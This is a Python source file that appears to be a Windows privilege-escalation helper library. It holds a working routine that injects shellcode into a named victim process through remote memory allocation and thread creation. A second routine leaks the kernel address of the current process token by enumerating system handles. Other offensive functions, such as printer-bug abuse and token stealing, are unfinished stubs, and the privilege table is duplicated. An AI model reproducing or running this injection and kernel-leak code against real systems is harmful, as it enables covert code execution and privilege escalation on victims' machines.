from ctypes import *
from ctypes.wintypes import *
from subprocess import check_output
import win32api
import win32con
import win32security
import win32process
from win32con import PROCESS_ALL_ACCESS
from win32com.client import GetObject
import struct

# todo: check out win32security, https://pypi.org/project/pywin32/, http://timgolden.me.uk/pywin32-docs/contents.html

########################################
#   NTSTAT S definitions
########################################

STATUS_INFO_LENGTH_MISMATCH = 0xC0000004


########################################
#   Access Rights for Access-Token Objects definitions
########################################
# https://docs.microsoft.com/en-us/windows/win32/secauthz/access-rights-for-access-token-objects

TOKEN_QUERY = 8


########################################
#   token privilege bit definitions
########################################

# https://raw.githubusercontent.com/hatRiot/token-priv/master/lib/tokenenum.py
PRIVILEGE_BITS = {
    "SeCreateTokenPrivilege"          : 0x000000002,
    "SeAssignPrimaryTokenPrivilege"   : 0x000000003,
    "SeLockMemoryPrivilege"           : 0x000000004,
    "SeIncreaseQuotaPrivilege"        : 0x000000005,
    "SeMachineAccountPrivilege"       : 0x000000006,
    "SeTcbPrivilege"                  : 0x000000007,
    "SeSecurityPrivilege"             : 0x000000008,
    "SeTakeOwnershipPrivilege"        : 0x000000009,
    "SeLoadDriverPrivilege"           : 0x00000000a,
    "SeSystemProfilePrivilege"        : 0x00000000b,
    "SeSystemtimePrivilege"           : 0x00000000c,
    "SeProfileSingleProcessPrivilege" : 0x00000000d,
    "SeIncreaseBasePriorityPrivilege" : 0x00000000e,
    "SeCreatePagefilePrivilege"       : 0x00000000f,
    "SeCreatePermanentPrivilege"      : 0x000000010,
    "SeBackupPrivilege"               : 0x000000011,
    "SeRestorePrivilege"              : 0x000000012,
    "SeShutdownPrivilege"             : 0x000000013,
    "SeDebugPrivilege"                : 0x000000014,
    "SeAuditPrivilege"                : 0x000000015,
    "SeSystemEnvironmentPrivilege"    : 0x000000016,
    "SeChangeNotifyPrivilege"         : 0x000000017,
    "SeRemoteShutdownPrivilege"       : 0x000000018,
    "SeUndockPrivilege"               : 0x000000019,
    "SeSyncAgentPrivilege"            : 0x00000001a,
    "SeEnableDelegationPrivilege"     : 0x00000001b,
    "SeManageVolumePrivilege"         : 0x00000001c,
    "SeImpersonatePrivilege"          : 0x00000001d,
    "SeCreateGlobalPrivilege"         : 0x00000001e,
    "SeTrustedCredManAccessPrivilege" : 0x00000001f,
    "SeRelabelPrivilege"              : 0x000000020,
    "SeIncreaseWorkingSetPrivilege"   : 0x000000021,
    "SeTimeZonePrivilege"             : 0x000000022,
    "SeCreateSymbolicLinkPrivilege"   : 0x000000023,
    "SeDelegateSessionUserImpersonatePrivilege" : 0x000000024
}



########################################
#   type definitions
########################################

NTSTATUS = DWORD
# PHANDLE = POINTER(HANDLE)
#ULONG_PTR = c_void_p
LPVOID = c_void_p
SIZE_T = c_size_t

########################################
#   struct definitions
########################################

# https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/handle_table_entry_ex.htm
# Structures for NtQuerySystemInformation.
class SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX(Structure):
    _fields_ = [
        ("Object", LPVOID),
        ("UniqueProcessId", LPVOID),
        ("HandleValue", LPVOID),
        ("GrantedAccess", ULONG),
        ("CreatorBackTraceIndex", USHORT),
        ("ObjectTypeIndex", USHORT),
        ("HandleAttributes", ULONG),
        ("Reserved", ULONG),
    ]

# https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/handle_ex.htm
class SYSTEM_HANDLE_INFORMATION_EX(Structure):
    _fields_ = [
        ("NumberOfHandles", LPVOID),
        ("Reserved", LPVOID),
        ("Handles", SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * 1),
    ]


########################################
#   DLL definitions
########################################

advapi32 = windll.advapi32
kernel32 = windll.kernel32
ntdll = windll.ntdll


########################################
#   DLL function definitions
#######################################
# important to not truncate input/output, must also use correct types
# also gives decent output on failure
# and not just random crashes during execution.

ntdll.NtQuerySystemInformation.argtypes = [DWORD, LPVOID, ULONG, POINTER(ULONG)]
ntdll.NtQuerySystemInformation.restype = NTSTATUS


kernel32.VirtualAllocEx.argtypes = [HANDLE, LPVOID, SIZE_T, DWORD, DWORD]
kernel32.VirtualAllocEx.restype = LPVOID

kernel32.OpenProcess.argtypes = [DWORD, BOOL, DWORD]
kernel32.OpenProcess.restype = c_ulong

kernel32.WriteProcessMemory.argtypes = [HANDLE, LPVOID, LPVOID, SIZE_T, POINTER(SIZE_T)]
kernel32.WriteProcessMemory.restype = BOOL

advapi32.OpenProcessToken.argtypes = [HANDLE, DWORD , POINTER(HANDLE)]
advapi32.OpenProcessToken.restype  = BOOL

kernel32.CreateRemoteThread.argtypes = [HANDLE, LPVOID, SIZE_T, LPVOID, LPVOID, DWORD, LPDWORD]
kernel32.CreateRemoteThread.restype  = HANDLE


########################################
#   exploit helper function definitions
########################################

# https://raw.githubusercontent.com/hatRiot/token-priv/master/lib/tokenenum.py
PRIVILEGE_BITS = {
    "SeCreateTokenPrivilege"          : 0x000000002,
    "SeAssignPrimaryTokenPrivilege"   : 0x000000003,
    "SeLockMemoryPrivilege"           : 0x000000004,
    "SeIncreaseQuotaPrivilege"        : 0x000000005,
    "SeMachineAccountPrivilege"       : 0x000000006,
    "SeTcbPrivilege"                  : 0x000000007,
    "SeSecurityPrivilege"             : 0x000000008,
    "SeTakeOwnershipPrivilege"        : 0x000000009,
    "SeLoadDriverPrivilege"           : 0x00000000a,
    "SeSystemProfilePrivilege"        : 0x00000000b,
    "SeSystemtimePrivilege"           : 0x00000000c,
    "SeProfileSingleProcessPrivilege" : 0x00000000d,
    "SeIncreaseBasePriorityPrivilege" : 0x00000000e,
    "SeCreatePagefilePrivilege"       : 0x00000000f,
    "SeCreatePermanentPrivilege"      : 0x000000010,
    "SeBackupPrivilege"               : 0x000000011,
    "SeRestorePrivilege"              : 0x000000012,
    "SeShutdownPrivilege"             : 0x000000013,
    "SeDebugPrivilege"                : 0x000000014,
    "SeAuditPrivilege"                : 0x000000015,
    "SeSystemEnvironmentPrivilege"    : 0x000000016,
    "SeChangeNotifyPrivilege"         : 0x000000017,
    "SeRemoteShutdownPrivilege"       : 0x000000018,
    "SeUndockPrivilege"               : 0x000000019,
    "SeSyncAgentPrivilege"            : 0x00000001a,
    "SeEnableDelegationPrivilege"     : 0x00000001b,
    "SeManageVolumePrivilege"         : 0x00000001c,
    "SeImpersonatePrivilege"          : 0x00000001d,
    "SeCreateGlobalPrivilege"         : 0x00000001e,
    "SeTrustedCredManAccessPrivilege" : 0x00000001f,
    "SeRelabelPrivilege"              : 0x000000020,
    "SeIncreaseWorkingSetPrivilege"   : 0x000000021,
    "SeTimeZonePrivilege"             : 0x000000022,
    "SeCreateSymbolicLinkPrivilege"   : 0x000000023,
    "SeDelegateSessionUserImpersonatePrivilege" : 0x000000024
}


def trigger_printer_bug():
    print("todo")


def se_impersonate_privilege_and_printer_bug(shellcode):
    print("todo")


def inject_shellcode_into_process(shellcode, victim_process):
    pid = 0
    WMI = GetObject('winmgmts:')
    processes = WMI.InstancesOf('Win32_Process')
    for p in processes:
        if p.Properties_("Name").Value == victim_process: pid = p.Properties_("ProcessID").Value

    if not pid: raise Exception(f"Couldn't find {victim_process} in process list")
    print(f"[+] Found {victim_process} pid: {pid}")
    hSystemProcess = kernel32.OpenProcess(0x1F0FFF, False, pid)
    if not hSystemProcess: raise Exception(f"Couldn't OpenProcess: {str(kernel32.GetLastError())}")
    hShellcode = kernel32.VirtualAllocEx(hSystemProcess, None, len(shellcode), 0x1000 | 0x2000, 0x40)
    if not hShellcode: raise Exception(f"Couldn't VirtualAllocEx memory: {str(kernel32.GetLastError())}")
    success = kernel32.WriteProcessMemory(hSystemProcess, hShellcode, shellcode, len(shellcode), None)    
    if not success: raise Exception(f"Couldn't WriteProcessMemory: {str(kernel32.GetLastError())}")
    success = kernel32.CreateRemoteThread(hSystemProcess, None, 0, hShellcode, 0, 0, None)
    if not success: raise Exception(f"Couldn't WriteProcessMemory: {str(kernel32.GetLastError())}")
    print(f"[+] Created remote thread in {victim_process} containing shellcode")


def steal_process_token_and_spawn(victim_process, new_process):
    print("[-] work in progress method, do not use. Exiting.")
    exit(-1)
    # TODO, not working. DON'T USE.
    pid = 0
    WMI = GetObject('winmgmts:')
    processes = WMI.InstancesOf('Win32_Process')
    for p in processes:
        if p.Properties_("Name").Value == victim_process: pid = p.Properties_("ProcessID").Value

    print(f"[+] Found {victim_process} pid: {pid}")
    hSystemProcess = win32api.OpenProcess(0x1F0FFF, False, pid)
    hToken = win32security.OpenProcessToken(hSystemProcess, win32con.TOKEN_QUERY | win32con.TOKEN_DUPLICATE)
    # fails here when not admin regardless of token privileges of the current process
    # even with all Se privs, presumably because the current process' DACL is checked during OpenProcessToken
    print(f"[+] Opened handle to {victim_process} token")
    print(hToken)
    

def get_own_process_token_handle(hProc, hToken):
    success = advapi32.OpenProcessToken(hProc, TOKEN_QUERY, byref(hToken))
    if not success: print(f"[-] Couldn't open token handle: {str(kernel32.GetLastError())}")
    return success


def add_token_privilege(priv):
    # TODO
    print('todo')


def leak_process_token_addr():
    # explained in detail here: https://www.exploit-db.com/exploits/42556
    # Using Windows APIs, first open a handle to our the current process token.
    # Then request a list of all system handles via a SystemExtendedHandleInformation request
    # to NtQuerySystemInformation. Traverse the returned list for the entry representing
    # the current process handle we have. The kernel address of the token can be found in the Object field.

    hProc = HANDLE(kernel32.GetCurrentProcess())
    pid = kernel32.GetCurrentProcessId()
    hToken = HANDLE()
    
    if not get_own_process_token_handle(hProc, hToken): return None

    # method only works for medium integrity processes as of Windows 8.1
    status = STATUS_INFO_LENGTH_MISMATCH
    # undocumented, enumeration here: https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/class.htm
    SystemExtendedHandleInformation = 0x40
    size = 0
    SystemExtendedInformation = None
    while(status == STATUS_INFO_LENGTH_MISMATCH):
        size += 1000
        SystemExtendedInformation = (BYTE * size)()
        status = ntdll.NtQuerySystemInformation(
            SystemExtendedHandleInformation,
            byref(SystemExtendedInformation),
            size,
            byref(DWORD(0))
        )
        
    SystemExtendedInformation = cast(SystemExtendedInformation, POINTER(SYSTEM_HANDLE_INFORMATION_EX))
    num_handles = SystemExtendedInformation.contents.NumberOfHandles
    Handles = cast(SystemExtendedInformation.contents.Handles, POINTER(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX))
    for h in Handles:
        if(pid == h.UniqueProcessId and hToken.value == h.HandleValue):
            print(f"[+] Leaked token kernel address: {hex(h.Object)}")
            return h.Object
        
    print(f"[-] Couldn't leak token kernel address")
    return None
